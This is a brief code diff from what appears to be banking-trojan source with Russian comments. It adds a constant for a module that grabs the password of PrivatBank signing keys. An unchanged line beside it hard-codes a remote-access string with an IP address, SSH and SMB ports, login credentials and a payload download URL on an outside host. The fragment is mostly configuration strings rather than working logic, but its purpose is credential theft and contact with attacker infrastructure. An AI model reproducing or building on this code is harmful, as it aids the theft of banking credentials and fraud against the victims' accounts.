@@ -203,6 +203,12 @@ CSSTR IFobsFlagCopy[] = "ifobscopy.txt";
 #endif
 
 
+#ifdef PrivatBankKeyPassH
+	// Имя системы грабера пароля ключа приватбанка
+	CSSTR EStrPrivatBankKeyPasswordGrabber[] = "privatkeypass";
+#endif
+
+
 CSSTR RDPRunParam[] = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73";
 
 //=============================================================================
